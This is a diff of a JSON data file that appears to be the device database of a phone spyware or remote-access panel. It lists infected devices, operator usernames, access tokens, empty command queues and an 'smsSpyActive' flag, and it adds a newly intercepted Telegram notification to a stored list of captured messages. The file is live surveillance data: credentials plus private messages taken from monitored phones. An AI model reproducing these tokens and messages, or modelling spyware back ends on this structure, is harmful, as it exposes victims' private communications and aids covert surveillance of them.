@@ -4,7 +4,7 @@
     "deviceName": "HP-ABLO-F55F",
     "ownerUsername": "Zarr",
     "token": "7055f57f74cb7eef5034e3301d747b14",
-    "lastSeen": 1777782333439,
+    "lastSeen": 1777782360454,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T05:33:28.300Z",
@@ -2557,6 +2557,14 @@
     "smsSpyActive": true,
     "smsMessages": [
       {
+        "appName": "Telegram",
+        "sender": "Damxzk stecu",
+        "content": "😒  Stiker",
+        "time": "03/05 11:26",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777782361720
+      },
+      {
         "appName": "WA Business",
         "sender": "WA Business",
         "content": "‎‎6 pesan dari 4 chat",
@@ -3725,7 +3733,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777782333731,
+    "lastSeen": 1777782360918,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
